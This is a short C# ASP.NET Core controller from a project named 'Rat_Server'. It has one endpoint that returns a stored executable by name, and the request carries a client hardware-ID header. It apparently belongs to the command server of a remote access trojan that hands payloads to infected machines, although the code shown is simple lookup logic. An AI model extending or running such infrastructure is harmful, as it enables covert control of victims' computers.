using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Rat_Server.Model.Context;
using Rat_Server.Model.Entities;
using static Org.BouncyCastle.Math.EC.ECCurve;

namespace Rat_Server.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ExeFileController : ControllerBase
    {
        private readonly RatDbContext _context;
        private readonly IConfiguration _config;

        public ExeFileController(RatDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
        }

        [HttpGet("GetExeFile/{Name}")]
        [ProducesResponseType<ExeFile>(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        public async Task<IActionResult> GetExeFile([FromHeader] string Hwid, string Name)
        {
            ExeFile? exeFile = await _context.ExeFiles.SingleOrDefaultAsync(e => e.Name == Name);
            if(exeFile == null)
            {
                return NotFound();
            }

            return Ok(exeFile);
        }
    }
}
